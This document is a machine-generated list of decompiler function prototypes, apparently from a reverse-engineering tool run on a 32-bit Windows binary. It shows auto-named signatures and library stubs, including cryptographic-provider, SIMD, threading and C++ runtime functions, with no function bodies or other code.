int __thiscall sub_41DAC1(void *this, char *a2, char *a3, int a4);
int __thiscall sub_41DB59(_DWORD *this, int a2, int a3, size_t a4, size_t a5, size_t *a6);
void __thiscall sub_41DBA4(int *this, int a2, int a3);
int __thiscall sub_41DBCB(void *this, int a2, int a3, int a4, int a5);
int __thiscall sub_41DBDA(int this, int a2, _DWORD *a3, _DWORD *a4, int *a5);
char __thiscall sub_41DD5E(_DWORD *this, char a2, char a3);
int __thiscall sub_41DDBC(_DWORD *this, int a2);
int __thiscall sub_41DE34(int *this, int a2);
int __thiscall sub_41DEB9(int this, void *a2);
int __cdecl sub_41DF09(int *a1, unsigned int a2);
int __fastcall sub_41DF4E(int *a1, int a2, void *a3, size_t Size);
bool __thiscall sub_41E3B8(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_41E407(_DWORD *this, _DWORD *a2);
_DWORD *sub_41E431();
int __stdcall sub_41E463(int a1, int a2);
int __thiscall sub_41E468(int *this, int a2, int a3, char a4);
int __thiscall sub_41E48B(void *this);
int __thiscall sub_41E493(_DWORD **this, int a2, int a3);
int __thiscall sub_41E4CA(_DWORD *this, int a2, int a3);
// void __userpurge sub_41E4F4(int *a1@<ecx>, size_t *a2@<ebx>, size_t a3@<ebp>, int a4, unsigned int a5, size_t a6, unsigned int a7);
int __thiscall sub_41E5B7(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_41E5FB(_DWORD *this, int a2, int a3, int a4, int a5, int a6);
char __thiscall sub_41E642(_DWORD *this, int a2, int a3, int a4, int a5);
void __thiscall sub_41E686(void *this, int a2, int a3);
unsigned int __thiscall sub_41E6AA(_DWORD *this, void *Src, unsigned int a3, int a4, int a5);
unsigned int __thiscall sub_41E6FA(_DWORD *this, unsigned int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_41E74A(int *this, char *Src, int a3, int a4, int a5);
int __thiscall sub_41E764(int this, int a2, int a3, int a4, int a5);
void *__thiscall sub_41E838(int this, char *Src, unsigned int a3);
int __thiscall sub_41E89F(int *this, char *Src, int a3, int a4, int a5, char a6);
int __thiscall sub_41EB0E(int *this, char *Src, int a3, int a4, int a5);
int __thiscall sub_41EB28(_DWORD *this, int a2, int a3);
void __thiscall sub_41EB56(_DWORD *this, int *a2);
int __thiscall sub_41EBEF(void *this);
int __thiscall sub_41EBFE(_DWORD *this, int a2, _DWORD *a3, int a4, int a5);
int __thiscall sub_41EC44(_DWORD *this, int a2);
char *__thiscall sub_41EC5D(char *this, int a2);
_DWORD *__thiscall sub_41ECA2(_DWORD *this);
_DWORD *__thiscall sub_41ECB8(_DWORD *Block, char a2);
char __thiscall sub_41ECE0(_DWORD *this, char *a2, int a3, _BYTE **a4);
char __thiscall sub_41ECF0(const char **this, char *Src, int a3, _BYTE **a4);
char __thiscall sub_41EDD5(_DWORD **this, int a2, int a3, int a4);
HCRYPTPROV *__thiscall sub_41EE3F(HCRYPTPROV *this);
HCRYPTPROV *__thiscall sub_41EECC(HCRYPTPROV *this);
std::exception *__thiscall sub_41EEEE(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_41EF0F(_DWORD *this, _DWORD *a2);
BOOL __thiscall sub_41F004(HCRYPTPROV *this);
BOOL __thiscall sub_41F014(HCRYPTPROV *this);
HCRYPTPROV *sub_41F022();
HCRYPTPROV *__thiscall sub_41F04F(HCRYPTPROV *Block, char a2);
BOOL __stdcall sub_41F06E(BYTE *pbBuffer, DWORD dwLen);
BOOL __cdecl sub_41F0C8(int a1, BYTE *pbBuffer, DWORD dwLen);
HCRYPTPROV *sub_41F103();
void __thiscall sub_41F193(void *this, int a2, size_t Size);
void *sub_41F1DE();
int __thiscall sub_41F1E4(_DWORD *this, int a2);
_DWORD **__thiscall sub_41F263(_DWORD **this, int a2);
void __cdecl sub_41F28C(_DWORD *a1, int a2, unsigned int a3);
void __cdecl sub_41F2B3(int a1, _DWORD *Destination, _DWORD *Source, rsize_t DestinationSize);
void __cdecl sub_41F2EB(int a1, _DWORD *Destination, int a3, void *Source, rsize_t SourceSize);
// unsigned int __userpurge sub_41F340@<eax>(int *a1@<ecx>, __m64 a2@<mm2>, __m64 a3@<mm3>, __m128i *a4, __m128i *a5, __m128i *a6, unsigned int a7, char a8);
int sub_41F54F();
int sub_41F6A7();
int sub_41F717();
char sub_41F72B();
char sub_41F73F();
char *__fastcall sub_41F753(int a1, int a2, int a3);
// _DWORD **__userpurge sub_41F78A@<eax>(int *a1@<ecx>, __m64 a2@<mm2>, __m64 a3@<mm3>, __m128i *a4, __m128i *a5, __m128i *a6);
// unsigned int *__usercall sub_41FCF7@<eax>(const __m128i *a1@<edx>, int a2@<ecx>, __m64 a3@<mm2>, __m64 a4@<mm3>);
void __thiscall sub_42035E(_DWORD *this, char *Src, size_t Size, int a4);
char *__fastcall sub_420B12(int a1, int a2, char *Source, unsigned int a4, unsigned int a5, char a6);
int __cdecl sub_420B8E(int a1);
_DWORD __cdecl j_j_unknown_libname_57(_DWORD); // weak
int sub_420BAC();
void *__cdecl sub_420BF0(size_t Size);
void __cdecl j_j___free_base(void *Block);
bool __cdecl sub_420C0B(unsigned int a1, unsigned int a2, unsigned int a3);
char __cdecl sub_420CB2(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4);
char __cdecl sub_420D68(unsigned int a1, unsigned int a2, unsigned int a3);
char sub_420DE5();
int __thiscall sub_420DF9(__m128i **this, __m128i *a2, unsigned int a3);
int __thiscall sub_420E8D(__m128i **this, __m128i *a2, unsigned int a3);
_DWORD *__cdecl sub_420F4A(_DWORD *a1);
void __cdecl sub_420F71(void *a1);
int __cdecl sub_420F84(int *a1, int *a2);
int __cdecl sub_421FFE(_DWORD *a1, unsigned int *a2);
int __fastcall sub_422CF6(const __m128i *a1, unsigned int *a2, int a3);
__m128i *__cdecl sub_423C52(int *a1, int *a2);
__m128i *__cdecl sub_423C75(_DWORD *a1, unsigned int *a2);
int __thiscall sub_423C98(void *this, char *a2, char *a3, int a4);
void *__thiscall sub_423D30(_DWORD *this, void *a2);
int __thiscall sub_423DF7(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
std::exception *__thiscall sub_423F56(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_423F77(_DWORD *this, _DWORD *a2);
int __thiscall sub_423FCD(_DWORD *this, _DWORD *a2);
void *__thiscall sub_42400A(_DWORD *this, size_t Size, char a3);
int __thiscall sub_42408D(_DWORD *this);
int __thiscall sub_42409A(int *this, _DWORD *Destination, size_t Size);
char *__thiscall sub_42417F(_DWORD *this, char *Src, char *a3);
int __thiscall sub_424325(int this);
_DWORD *__thiscall sub_424361(_DWORD *this, int a2);
int __fastcall sub_42438B(int a1, int a2, unsigned int a3);
int __fastcall sub_4243AE(int a1, int a2, unsigned int a3);
int __fastcall sub_4243D1(int a1, int a2, int a3);
int __fastcall sub_42441F(int a1, int a2, unsigned int a3);
_DWORD *__thiscall sub_424445(_DWORD *this);
void *__fastcall sub_4244CF(int a1, int a2);
_DWORD *__thiscall sub_4244FB(_DWORD *Block, char a2);
void *__fastcall sub_42451D(void *Block, int a2, char a3);
int __stdcall sub_42454A(int a1);
_DWORD *__thiscall sub_424568(void *this);
// void __userpurge sub_42459A(int a1@<ecx>, int a2@<ebp>, int a3, int a4, unsigned int a5, unsigned int a6);
__m128i *__thiscall sub_424686(_DWORD **this, unsigned int *a2);
_DWORD __stdcall sub_42469A(_DWORD, _DWORD); // weak
void __thiscall sub_424733(void **this);
int __thiscall sub_424740(_DWORD *this);
int __fastcall sub_424747(int a1, int a2, unsigned int a3, int a4);
int __fastcall sub_424768(int a1, int a2, unsigned int a3, int a4);
int __fastcall sub_424789(int a1, int a2, unsigned int a3, int a4);
void *__fastcall sub_4247AA(int a1, int a2, void *a3, int a4);
void *__cdecl sub_4247CC(void *Buf, int a2, _DWORD *a3);
bool __cdecl sub_424809(int a1, _DWORD *a2);
int __thiscall sub_424820(int this, void *Source, rsize_t SourceSize);
int __thiscall sub_424883(void *this, unsigned int a2);
int __thiscall sub_4248A3(void *this, int a2, void *Src, size_t Size, _BYTE *a5, unsigned int a6, int *a7);
int __thiscall sub_4249C0(_BYTE *this, int a2, char *Source, unsigned int a4, void *a5, int Src);
_DWORD *__thiscall sub_424BAD(_DWORD *this, int a2);
_DWORD *__thiscall sub_424C2C(_DWORD *this, size_t Size);
_DWORD *__thiscall sub_424C54(_DWORD *this, _DWORD *a2);
void __thiscall sub_424C9A(_DWORD *this);
char *__thiscall sub_424CAC(_DWORD *this, char a2);
void __thiscall sub_424CD3(_DWORD *this);
_DWORD *__thiscall sub_424D28(int this);
int __thiscall sub_424D6A(void *this, int a2, int *a3, __int64 a4, int a5, int a6);
int __thiscall sub_424DDC(_DWORD *this, int a2, int *a3, __int64 a4, int a5, int a6);
int __thiscall sub_424E4E(int this, size_t *Block);
__int64 __thiscall sub_424EC6(_DWORD *this);
int __thiscall sub_424F26(_DWORD *this);
int __thiscall sub_424F3F(_DWORD *this, _BYTE *a2);
int __thiscall sub_424F8E(int *this, int a2, int a3);
int __thiscall sub_424FD7(int *this, int a2);
bool __thiscall sub_42501F(_DWORD *this);
_DWORD *__thiscall sub_42503C(_DWORD *this, int a2);
int __thiscall sub_425072(_DWORD *this, int a2);
int __thiscall sub_425095(int this, _BYTE *a2);
__int64 __thiscall sub_4250C5(void *this, int a2, int a3);
int __thiscall sub_425104(_DWORD *this, _BYTE *a2);
__int64 __thiscall sub_425122(void *this, int a2);
int __thiscall sub_42515F(int this, char *Src, int a3, int a4, int a5);
size_t __thiscall sub_4251FF(_DWORD *this, void *Src, unsigned int a3);
int __thiscall sub_42523D(int this, int *a2, unsigned int *a3, int a4, char a5);
int __thiscall sub_425370(_DWORD *this, int a2, unsigned int *a3, int a4, int a5);
int __thiscall sub_42549E(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int sub_4254E3();
int sub_4257AB();
void *__cdecl sub_4257B1(char *Block, char *a2);
int __cdecl sub_4257CC(void **a1, void **a2);
int __cdecl sub_4257E5(int (__thiscall ***a1)(_DWORD, _DWORD), int (__thiscall ***a2)(_DWORD, _DWORD));
void *__cdecl sub_4257FF(char *a1, int a2, int *a3);
void __cdecl sub_42585E(_DWORD *a1, int a2);
void __cdecl sub_425881(char *a1, int a2);
int __cdecl sub_4258DD(int a1, int a2, int a3);
char *__cdecl sub_425942(int *a1, int *a2, char *a3);
int __cdecl sub_4259A4(int a1, int a2, int a3);
char *__cdecl sub_4259C9(int *a1, int *a2, char *a3);
_DWORD *__thiscall sub_4259EE(_DWORD *this, unsigned int a2);
int __thiscall sub_425A4A(int this, int a2);
int __thiscall sub_425AA6(int this, int a2);
int __thiscall sub_425B04(int this, int *a2, char a3, int a4);
void *__thiscall sub_425BD6(void *Block, char a2);
int __thiscall sub_425C00(void *this, int a2, void *a3, int *a4, int *a5, int *a6);
void *__thiscall sub_425C2C(int *this, void *a2, int *a3, int *a4, int *a5, int *a6);
_DWORD *__thiscall sub_426016(void *this, _DWORD *a2, int a3, int a4);
char __thiscall sub_42605A(int this);
int __thiscall sub_4260EA(int *this, int *a2, int *a3);
_DWORD *__thiscall sub_4261D6(void *this, _DWORD *a2, int a3, int a4);
int __thiscall sub_42621A(void *this, int a2, int *a3, int *a4, unsigned int a5);
int __thiscall sub_426239(int *this, int a2, int *a3, int *a4, unsigned int a5);
char __thiscall sub_4264D7(_DWORD *this, unsigned int a2);
char __thiscall sub_426525(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_426573(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_42659E(_DWORD *this, unsigned int a2);
int __thiscall sub_4265CD(_DWORD *this, int a2);
_DWORD *__thiscall sub_4265F0(int *this, unsigned int a2);
char *__thiscall sub_426685(void **this, unsigned int a2);
unsigned int __thiscall sub_426724(int *this, unsigned int a2);
unsigned int __thiscall sub_42676C(void **this, unsigned int a2);
int __thiscall sub_4267BC(int this);
int __thiscall sub_4267F6(int this);
int __thiscall sub_42682C(void **this);
char *__stdcall sub_426862(char *a1, int a2, int *a3);
unsigned int __thiscall sub_426887(int *this, unsigned int a2);
unsigned int __thiscall sub_4268F7(int *this, unsigned int a2);
unsigned int __thiscall sub_426922(int this, unsigned int a2, int *a3);
int __cdecl sub_4269DC(int a1, unsigned int a2, int a3, int a4, int *a5);
int __cdecl sub_426A18(int a1, unsigned int a2, int a3, int a4, _DWORD *a5);
int __cdecl sub_426A5A(int a1, unsigned int a2, int a3, int a4, int *a5);
int __cdecl sub_426A80(int a1, unsigned int a2, int a3, int a4, _DWORD *a5);
_DWORD *__cdecl sub_426AA6(_DWORD *a1, int a2, int a3, int a4, int a5, _DWORD **a6, int a7, unsigned int a8);
_DWORD *__cdecl sub_426B11(_DWORD *a1, int a2, int a3, int a4, unsigned int a5, _DWORD **a6, int a7, unsigned int a8);
_DWORD *__cdecl sub_426B7C(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426BE4(_DWORD *a1, int a2, int a3, int a4, unsigned int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426C52(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426C81(_DWORD *a1, int a2, int a3, int a4, unsigned int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426CB0(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, _DWORD **a6, int a7, unsigned int a8);
_DWORD *__cdecl sub_426D1B(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, _DWORD **a6, int a7, unsigned int a8);
_DWORD *__cdecl sub_426D86(_DWORD *a1, _DWORD **a2, int a3, unsigned int a4, _DWORD **a5, int a6, int a7, _DWORD **a8, int a9, unsigned int a10);
_DWORD *__cdecl sub_426E0D(_DWORD *a1, _DWORD **a2, int a3, unsigned int a4, _DWORD **a5, int a6, int a7, _DWORD **a8, int a9, unsigned int a10);
_DWORD *__cdecl sub_426E94(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426EFC(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426F74(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7);
_DWORD *__cdecl sub_426FA3(_DWORD *a1, int a2, unsigned int a3, int a4, int a5, int a6, unsigned int a7);
int __cdecl sub_426FD2(_DWORD **a1, int a2, unsigned int a3, _DWORD **a4, int a5, int a6, int *a7);
int __cdecl sub_42702D(_DWORD **a1, int a2, unsigned int a3, _DWORD **a4, int a5, int a6, _DWORD *a7);
_DWORD *__cdecl sub_427088(_DWORD *a1, _DWORD **a2, int a3, unsigned int a4, _DWORD **a5, int a6, int a7, _DWORD **a8, int a9, unsigned int a10);
_DWORD *__cdecl sub_4270F5(_DWORD *a1, _DWORD **a2, int a3, unsigned int a4, _DWORD **a5, int a6, int a7, _DWORD **a8, int a9, unsigned int a10);
_DWORD *__cdecl sub_427162(_DWORD *a1, _DWORD **a2, int a3, int a4, _DWORD **a5, int a6, int a7, _DWORD **a8, int a9, unsigned int a10);
_DWORD *__cdecl sub_4271E9(_DWORD *a1, _DWORD **a2, int a3, int a4, _DWORD **a5, int a6, unsigned int a7, _DWORD **a8, int a9, unsigned int a10);
_DWORD *__thiscall sub_427270(_DWORD *this);
_DWORD *__thiscall sub_42728C(_DWORD *this, int a2);
_DWORD *__thiscall sub_4272AE(_DWORD *this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_4272CD(_DWORD *this, _DWORD *a2);
void __thiscall sub_427371(void **this);
void __thiscall sub_42738C(void **this);
void __thiscall sub_4273A7(int this);
int __thiscall sub_4273C3(_DWORD *this, int a2);
int __thiscall sub_4273ED(int **this);
int __thiscall sub_427416(int **this);
_DWORD *__thiscall sub_42743E(int this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_427484(int this, _DWORD *a2, int a3);
char *__thiscall sub_4274CA(char *this, char a2);
int __thiscall sub_4274F1(_DWORD *this);
int __thiscall sub_42751B(_DWORD *this, int a2, unsigned __int64 *a3, __int64 a4, int a5, int a6);
char __thiscall sub_42757C(_DWORD *this);
int __thiscall sub_4275D1(_DWORD *this, int a2);
char __thiscall sub_427613(_DWORD *this, int a2);
__int64 __thiscall sub_42762F(_DWORD *this);
int __thiscall sub_427650(_DWORD *this);
int __thiscall sub_427655(_DWORD *this);
int __thiscall sub_42765A(_DWORD *this);
int __thiscall sub_427667(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_4276C1(_DWORD *this, int a2);
int __thiscall sub_4276CB(_DWORD *this);
int __thiscall sub_4276D3(_DWORD *this, int a2, int a3, int a4, int a5);
// int unknown_libname_23(void); weak
int __thiscall sub_427762(_DWORD *this, int a2, int *a3);
int __thiscall sub_4277A4(_DWORD *this, int a2, _DWORD *a3);
void __thiscall sub_4277E6(int this, unsigned int a2);
void __thiscall sub_42790A(int this, unsigned int a2);
int __thiscall sub_427A2D(_DWORD *this, int a2, int a3, int a4, unsigned int a5, int *a6);
int __thiscall sub_427DC2(_DWORD *this, int a2, int a3, int a4, unsigned int a5, int *a6);
_DWORD *__thiscall sub_428163(_DWORD *this, _DWORD *a2, int a3, int a4, int a5);
void __thiscall sub_428178(int this);
void __thiscall sub_4281CF(int this);
int __thiscall sub_428226(_DWORD *this, unsigned int a2, int *a3);
int __thiscall sub_42828E(_DWORD *this, unsigned int a2, int *a3);
// int __thiscall std::wstring::back(_DWORD); weak
// int __thiscall std::wstring::back(_DWORD); weak
_DWORD *__thiscall sub_428344(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_428358(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_428370(_DWORD *this, _DWORD *a2, _DWORD **a3, int a4, int a5, _DWORD **a6, int a7, int a8);
_DWORD *__thiscall sub_4284F2(_DWORD *this, _DWORD *a2, _DWORD **a3, int a4, int a5, _DWORD **a6, int a7, int a8);
int __thiscall sub_428674(_DWORD *this, int *a2);
int __thiscall sub_4286F5(_DWORD *this, _DWORD *a2);
int __thiscall sub_42877A(int this, int *a2);
int __thiscall sub_428801(int this, _DWORD *a2);
unsigned int __cdecl sub_42888B(void (__cdecl *a1)(__m128i *, int, int), void (__cdecl *a2)(__m128i *, __m128i *, __m128i *, __m128i *, int, int), int a3, int a4, __m128i *a5, __m128i *a6, __m128i *a7, unsigned int a8, char a9);
__m128i *__cdecl sub_428B46(__m128i *a1, __m128i *a2, __m128i *a3, __m128i *a4, __m128i *a5, unsigned int a6);
__m128i *__cdecl sub_428C24(__m128i *a1, __m128i *a2, int a3);
unsigned int __cdecl sub_428C84(int a1, int a2, __m128i *a3, __m128i *a4, __m128i *a5, unsigned int a6, char a7);
unsigned int __cdecl sub_428CB0(_OWORD *a1, int a2);
char *__cdecl sub_428D01(char *Src, size_t Size, char *a3);
__m128i *__cdecl sub_428E46(__m128i *a1, __m128i *a2, unsigned int a3, int a4);
// __m128i *__usercall sub_4290DD@<eax>(__m128i *result@<eax>, __m128i *a2, __m128i *a3, unsigned int a4, int a5);
LARGE_INTEGER sub_42946A();
LARGE_INTEGER sub_4294DD();
__int64 sub_429550();
char sub_4295BE();
_DWORD *__thiscall sub_4295F3(_DWORD *this);
std::exception *__thiscall sub_42960B(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_429626(std::exception *this, char *a2);
std::exception *__thiscall sub_429645(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_429660(std::exception *this, char *a2);
std::exception *__thiscall sub_42967F(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_42969A(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_4296B5(std::exception *this, char *a2);
std::exception *__thiscall sub_4296D4(std::exception *this, char *a2);
void __noreturn sub_4296F3(void); // weak
void __cdecl __noreturn sub_429710(char *a1); // idb
void __cdecl __noreturn sub_429730(char *a1); // idb
void __cdecl __noreturn sub_429750(char *a1); // idb
// int __cdecl _Mbrtowc(wchar_t *, const char *, size_t, mbstate_t *, const _Cvtvec *);
// _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this); idb
// _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, int); idb
// void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this); idb
int sub_42999D();
void sub_4299A9();
// int __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *); idb
// void __cdecl __noreturn std::_Throw_Cpp_error(int); idb
// void __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(std::_Fac_tidy_reg_t *__hidden this); idb
// void __cdecl std::_Facet_Register(struct std::_Facet_base *); idb
int sub_429CD2();
// struct std::locale::_Locimp *__cdecl std::locale::_Init(bool); idb
// void __cdecl std::_Locinfo::_Locinfo_ctor(struct std::_Locinfo *, const char *Locale); idb
// void __cdecl std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *); idb
int j____uncaught_exception(void); // weak
_DWORD *__thiscall sub_429EF2(_DWORD *this, int a2, char a3, int a4);
void __thiscall sub_429F5E(char *this);
char *__thiscall sub_429FBC(_DWORD *this, char a2);
struct std::_Facet_base *__cdecl sub_42A04E(std::locale *a1);
_DWORD *__thiscall sub_42A0E3(_DWORD *this, int a2, char a3, int a4);
_DWORD *__thiscall sub_42A14A(_DWORD *this);
int __thiscall sub_42A221(_DWORD *this);
// int __thiscall sub_42A2B9(_DWORD); weak
void __thiscall sub_42A2DA(char *this);
int __stdcall sub_42A338(char a1);
_DWORD *__thiscall sub_42A340(_DWORD *Block, char a2);
// _DWORD __stdcall sub_42A3BA(char); weak
void *__thiscall sub_42A3DF(void *Block, char a2);
// int __cdecl std::codecvt<wchar_t,char,_Mbstatet>::_Getcat(int, std::locale *); idb
int __thiscall sub_42A575(_DWORD *this, void *a2);
// int std::wfilebuf::_Reset_back(void); weak
// int __thiscall std::wfilebuf::close(_DWORD); weak
int __thiscall sub_42A896(_DWORD *this, std::locale *a2);
// int __thiscall std::wios::init(struct std::ios_base *, int, char); idb
int __stdcall sub_42AA0A(int a1);
// void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *); idb
FILE *__cdecl sub_42B1F3(char *FileName, int a2, int ShFlag);
FILE *__cdecl sub_42B293(char *FileName, int a2, int ShFlag);
FILE *__cdecl sub_42B29C(char *FileName, int a2, int ShFlag);
// const char *__cdecl std::_Syserror_map(int); idb
// void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int); idb
// void __stdcall `vector constructor iterator'(void *, unsigned int, unsigned int, void *(__thiscall *)(void *)); idb
_DWORD *__cdecl sub_42B416(int a1);
void sub_42B462();
void __thiscall sub_42B46A(int this);
signed __int32 __thiscall sub_42B475(int this);
int __thiscall sub_42B488(char *this);
char __thiscall sub_42B637(void *this);
void __thiscall sub_42B68F(int this);
void __thiscall sub_42B697(int this);
int __thiscall sub_42B6A2(char *this);
// void __cdecl _Mtx_destroy_in_situ(_Mtx_t);
// void __cdecl _Mtx_init_in_situ(_Mtx_t, int);
// int __cdecl _Mtx_lock(_Mtx_t);
// int __cdecl _Mtx_unlock(_Mtx_t);
// _Ctypevec *__cdecl _Getctype(_Ctypevec *__return_ptr __struct_ptr retstr);
// int __cdecl _Wcrtomb(char *, wchar_t, mbstate_t *, const _Cvtvec *);
// void __cdecl _Cnd_do_broadcast_at_thread_exit();
// int __cdecl _Thrd_detach(_Thrd_t);
// DWORD __stdcall GetCurrentThreadId();
int j____uncaught_exceptions(void); // weak
// void (__cdecl *__cdecl std::set_new_handler(void (__cdecl *)()))(); idb
// int __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection); idb
// int __cdecl unknown_libname_29(LPCRITICAL_SECTION lpCriticalSection); idb
void __cdecl sub_42BC82(LPCRITICAL_SECTION lpCriticalSection);
// _DWORD __cdecl unknown_libname_30(_DWORD); weak
// _DWORD __cdecl unknown_libname_31(_DWORD); weak
// _DWORD __cdecl unknown_libname_32(_DWORD); weak
// int __cdecl __crtCreateEventExW(LPSECURITY_ATTRIBUTES lpEventAttributes, LPCWSTR lpName, int, int); idb
// _DWORD __cdecl __crtCreateSemaphoreExW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_33(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_34(_DWORD, _DWORD, _DWORD); weak
// int __cdecl __crtFlushProcessWriteBuffers(_DWORD); weak
// _DWORD __cdecl unknown_libname_35(_DWORD, _DWORD); weak
// int __crtGetCurrentProcessorNumber(void); weak
// _DWORD __cdecl unknown_libname_36(_DWORD); weak
// int __cdecl __crtInitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, int); idb
// _DWORD __cdecl unknown_libname_37(_DWORD); weak
// _DWORD __cdecl unknown_libname_38(_DWORD); weak
// _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_41(_DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_42(_DWORD); weak
// _DWORD __cdecl unknown_libname_43(_DWORD); weak
// void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *__hidden this); idb
void *sub_42C3BB();
_DWORD *__cdecl sub_42C7C7(_DWORD *a1);
void __thiscall sub_42C813(_DWORD *this);
// int __cdecl unknown_libname_44(int, _Mtx_t, int); idb
void __thiscall sub_42C8E3(_DWORD *this);
int __thiscall sub_42C8EB(char *this);
void __thiscall sub_42C8F6(_DWORD *this);
int __thiscall sub_42C8FE(char *this);
// int __cdecl _Cnd_broadcast(_Cnd_t);
// void __cdecl _Cnd_destroy_in_situ(_Cnd_t);
_DWORD __cdecl sub_42C9F0(_DWORD); // weak
int __cdecl sub_42C9F5(int a1, _Mtx_t a2); // idb
int __thiscall sub_42CB3D(int this);
_DWORD *__thiscall sub_42CB90(_DWORD *this);
// int __cdecl atexit(void (__cdecl *)());
// void *__cdecl operator new(size_t Size); idb
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *)); idb
void __cdecl sub_42CF7C(void *Block);
_DWORD *__thiscall sub_42CF8A(_DWORD *Block, char a2);
void __cdecl j_j_j___free_base(void *Block);
// _DWORD __cdecl _Init_thread_footer(_DWORD); weak
// _DWORD __cdecl _Init_thread_header(_DWORD); weak
void sub_42D1BE();
// int __cdecl unknown_libname_45(_DWORD); weak
int sub_42D27E();
int sub_42D286();
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
// unsigned __int64 __usercall sub_42DA63@<edx:eax>(unsigned __int64 a1@<edx:eax>);
void __cdecl sub_42DC1B(void *Block);
LPTOP_LEVEL_EXCEPTION_FILTER sub_42DFCB();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_42E02D();
void *sub_42E0F4();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_42E117();
void *sub_42E123();
void *sub_42E129();
void sub_42E12F();
void __cdecl sub_42E15B(); // idb
HANDLE *__thiscall sub_42E3BD(HANDLE *Parameter, DWORD DueTime);
LPCRITICAL_SECTION __thiscall sub_42E44D(LPCRITICAL_SECTION lpCriticalSection);
_DWORD *__thiscall sub_42E462(_DWORD *this);
_DWORD *__thiscall sub_42E472(_DWORD *this);
std::exception *__thiscall sub_42E492(std::exception *this, struct std::exception *a2);
int *__thiscall sub_42E4AD(int *this, int a2);
void __thiscall sub_42E4D7(LPCRITICAL_SECTION lpCriticalSection);
void __thiscall sub_42E4DF(void **this);
int __thiscall sub_42E515(_DWORD *this, unsigned int a2);
_DWORD *sub_42E59B();
void __thiscall sub_42E5BD(volatile signed __int32 *Block);
HMODULE __stdcall sub_42E5DC(int a1, volatile signed __int32 *Block, int a3);
void __stdcall sub_42E623(volatile signed __int32 *Block, int a2);
void __thiscall sub_42E671(volatile signed __int32 *Block);
char __thiscall sub_42E696(volatile signed __int32 *this);
_DWORD *__thiscall sub_42E6C8(_DWORD *this, _DWORD *a2);
int __thiscall sub_42E730(_DWORD *this);
void __thiscall sub_42E75B(LPCRITICAL_SECTION lpCriticalSection);
signed __int32 __thiscall sub_42E763(volatile signed __int32 *this);
signed __int32 __thiscall sub_42E793(volatile signed __int32 *this);
bool __thiscall sub_42E7C1(int this, volatile signed __int32 *Block, char a3);
int __thiscall sub_42E85C(int *this);
void __thiscall sub_42E872(_DWORD *this);
int sub_42E88A(void); // weak
void __thiscall sub_42E8A1(LPCRITICAL_SECTION lpCriticalSection);
void __thiscall sub_42E8A9(volatile signed __int32 *this);
void __thiscall sub_42E8AD(volatile signed __int32 *this);
int __thiscall sub_42E8B8(_DWORD *this, int a2);
int __thiscall sub_42E8D6(_DWORD *this, int a2);
char __thiscall sub_42E8F5(int this);
char __thiscall sub_42E97E(_DWORD *this);
signed __int32 __thiscall sub_42E9F5(signed __int32 this, signed __int32 *a2);
char __thiscall sub_42EA44(volatile signed __int32 *this);
int __cdecl sub_42EA5B(_DWORD *a1, int a2, int a3);
signed __int32 __thiscall sub_42EA98(void *this);
char __thiscall sub_42EAC6(signed __int32 this);
char __thiscall sub_42EB11(void *this, DWORD DueTime);
void __thiscall sub_42EB6F(void *this);
int __thiscall sub_42EBE0(int this, int a2, char a3, unsigned __int8 a4);
